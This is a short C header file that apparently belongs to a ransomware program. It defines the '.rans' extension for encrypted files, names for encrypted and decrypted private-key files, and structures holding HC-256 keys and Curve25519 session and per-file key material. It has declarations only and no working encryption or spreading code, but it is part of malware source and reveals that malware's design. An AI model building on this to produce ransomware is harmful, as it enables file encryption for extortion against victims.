#pragma once

/* Extension of encrypted files. */
#define RANSOMWARE_EXTENSION	L".rans"
/* Name of the encrypted private key file. */
#define ENC_PK_FILE_NAME		L"pk.dat"
/* Name of the decrypted private key file. */
#define DEC_PK_FILE_NAME		L"pk.dec"

/* Size of the ransomware extension in wchar_t. */
#define SIZE_OF_EXTENSION		((sizeof(RANSOMWARE_EXTENSION) - 1) / sizeof(wchar_t))

typedef struct PROG_KEYS
{
	BYTE hc256Key[32];
	BYTE hc256Vector[32];
} Keys_t;

typedef struct PROG_SESSION
{
	BYTE curve25519Shared[32];
	BYTE curve25519Private[32];
} Session_t;

typedef struct FILE_METADATA
{
	BYTE curve25519Public[32];
	DWORD xcrc32Hash;
} FileMetadata_t;